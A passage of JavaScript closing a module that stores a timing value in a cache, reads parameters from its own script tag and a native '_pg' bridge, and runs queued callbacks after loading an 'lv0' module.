                    topic: "cache",
                    action: "set",
                    key: "_t_c",
                    value: {
                        t: t,
                        c: c
                    }
                };
                if (_pg) {
                    var t_c = {
                        c: 10,
                        t: t / 100
                    };
                    try {
                        _pg.setJI(JSON.stringify(t_c));
                    } catch (e) {}
                } else if (R.requestBG) {
                    R.requestBG(request);
                }
            },
            setParams: function setParams() {
                if ($("#" + C.mainid).length) {
                    var strParams = $("#" + C.mainid).attr("src").split("?")[1];
                    R.params = common.parseParams(strParams);
                } else {
                    R.inContent = true;
                }
                if (_pg) {
                    var clientEnv = JSON.parse(_pg.getAll());
                    $.extend(R.params, clientEnv);
                }
            },
            run: function run(callback) {
                this.init();
                R.require([ "lv0" ], function(lv0) {
                    lv0.init();
                    if (R.waitings) {
                        for (var i = 0; i < R.waitings.length; i++) {
                            setTimeout(function(index) {
                                return function() {
                                    R.waitings[index]();
                                };
                            }(i), 0);
                        }
                    }
                });
            }
        };
        return app;
    });
})(this.com.jtds.jtds);